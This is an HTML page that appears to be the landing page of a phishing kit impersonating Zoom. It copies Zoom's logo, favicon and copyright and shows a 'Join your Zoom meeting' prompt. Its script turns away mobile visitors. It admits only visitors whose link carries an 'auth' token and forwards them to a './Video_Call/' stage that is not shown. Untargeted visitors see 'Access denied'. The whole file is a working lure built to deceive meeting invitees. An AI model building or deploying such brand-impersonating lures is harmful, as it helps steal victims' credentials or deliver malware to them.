<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Join conversation on Zoom</title>
  <link rel="icon" type="image/png" href="https://st1.zoom.us/zoom.ico">
  <link rel="stylesheet" type="text/css" href="css/style22.css">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .login-container {
      background-color: #ffffff;
      padding: 48px 40px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      border-radius: 16px;
      width: 100%;
      max-width: 420px;
      text-align: center;
      animation: fadeIn 0.5s ease-out;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(-20px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .login-container img.logo {
      width: 80px;
      height: auto;
      max-width: 100%;
      margin-bottom: 24px;
    }

    .login-container h3 {
      margin: 0 0 8px 0;
      font-size: 28px;
      font-weight: 600;
      color: #2d2d2d;
      letter-spacing: -0.5px;
    }

    .login-container .subtitle {
      color: #666;
      font-size: 15px;
      margin-bottom: 32px;
    }

    .login-container button {
      width: 100%;
      padding: 14px 24px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 15px;
      font-weight: 600;
      transition: all 0.2s ease;
      margin-bottom: 12px;
      letter-spacing: 0.3px;
    }

    .login-button {
      background-color: #0E72ED;
      color: #ffffff;
      box-shadow: 0 4px 14px rgba(14, 114, 237, 0.3);
    }

    .login-button:hover {
      background-color: #0B5EC7;
      box-shadow: 0 6px 20px rgba(14, 114, 237, 0.4);
      transform: translateY(-1px);
    }

    .login-button:active {
      transform: translateY(0);
    }

    .signup-button {
      background-color: #f5f5f5;
      color: #2d2d2d;
      border: 2px solid #e0e0e0;
    }

    .signup-button:hover {
      background-color: #ebebeb;
      border-color: #d0d0d0;
    }

    .login-container p {
      margin-top: 24px;
      color: #666;
      font-size: 14px;
    }

    .login-container a {
      color: #0E72ED;
      text-decoration: none;
      font-weight: 500;
    }

    .login-container a:hover {
      text-decoration: underline;
    }

    .login-container .footer-text {
      font-size: 12px;
      color: #999;
      margin-top: 32px;
      padding-top: 24px;
      border-top: 1px solid #f0f0f0;
    }

    @media (max-width: 480px) {
      .login-container {
        padding: 32px 24px;
      }

      .login-container h3 {
        font-size: 24px;
      }
    }
  </style>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
</head>

<body>
  <div class="login-container">
    <img src="https://st1.zoom.us/static/6.3.52789/image/new/topNav/Zoom_logo.svg" alt="Zoom Logo" class="logo">
    <h3>Join your Zoom meeting</h3>
    <p class="subtitle">Click below to continue with your browser or the Zoom app</p>

    <button class="login-button" id="btnSubmitMain" onClick="begin()">Continue on this browser</button>
    <button class="signup-button" id="btnSubmitMain2" onClick="begin()">Join on the Zoom app</button>

    <p><a href="#">Can't access your account?</a></p>
    <p class="footer-text">2026 Zoom Video Communications, Inc. All rights reserved.</p>
  </div>
  <script>
    function isMobileDevice() {
      return /Mobi|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    if (isMobileDevice()) {
      window.location.href = "./sorry.php";
    }
  </script>

  <script>
    function loading(message, type) {
      $("#btnSubmitMain").html(message);
      if (type === "error") {
        $("#btnSubmitMain").css("background-color", "#dc3545");
      } else if (type === "reset") {
        $("#btnSubmitMain").html("Continue on this browser");
        $("#btnSubmitMain").css("background-color", "#0E72ED");
        $("#btnSubmitMain").attr("disabled", false);
      }
    }

    function begin() {
      const urlParams = new URLSearchParams(window.location.search);
      const auth = urlParams.get('auth')

      if ((urlParams.get('auth') == undefined || urlParams.get('auth') == null)) {
        $("#btnSubmitMain").attr("disabled", true)
        loading("&nbsp;&nbsp;&nbsp; Loading...", "error")

        setTimeout(() => {
          loading("Access denied - invalid link", "error");
          setTimeout(() => {
            loading("", "reset");
          }, 2000);
        }, 1000);
      } else {
        // Redirect to Video_Call/ matching the reference flow
        window.location.href = `./Video_Call/?auth=${auth}`;
      }
    }
  </script>
</body>

</html>